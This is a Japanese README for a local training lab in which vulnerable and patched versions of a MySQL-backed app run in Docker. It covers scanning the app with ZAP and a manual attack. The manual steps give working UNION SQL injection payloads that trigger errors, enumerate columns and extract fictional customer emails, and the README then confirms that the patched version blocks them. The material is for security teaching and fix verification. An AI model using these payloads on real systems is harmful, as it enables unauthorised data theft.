# PoC⑤: MySQL 実DBでのUNION SQLインジェクション

SQLiteではなくMySQLコンテナを使い、DB方言差と情報漏洩の流れを見せる。

```bash
cd ..
docker compose up --build
# 脆弱版: http://127.0.0.1:5005
# 修正版: http://127.0.0.1:5015
```

## ZAPで見るポイント

- ZAPの対象は `http://127.0.0.1:5005/` に限定する
- Spider後にActive Scanを実行し、Alertsの `SQL Injection` を確認する
- Technology DetectionやSQLエラーはDB種別推測の材料になるが、常に断定できるわけではない
- AlertsのEvidence、HistoryのRequest/Response、画面上のSQLエラーを合わせて見る

## 手動攻撃

### 1. エラーで脆弱性を確認する

```
q = '
```

→ MySQLのSQLエラーが表示される。

### 2. カラム数を確認する

```
q = a%' ORDER BY 4 -- 
```

→ 3カラムしかないためエラー。`ORDER BY 3 -- ` ではエラーが消える。

### 3. 顧客情報を抜き出す

```
q = zzz%' UNION SELECT id, email, last_order_total FROM customers -- 
```

→ 商品検索結果に、架空顧客のメールアドレスと直近注文金額が表示される。

## 対策確認

修正版 `http://127.0.0.1:5015` で同じペイロードを入力する。

- `UNION SELECT` は構文として解釈されない
- 詳細なSQLエラーは画面に表示されない
- ヒット件数は0件になる
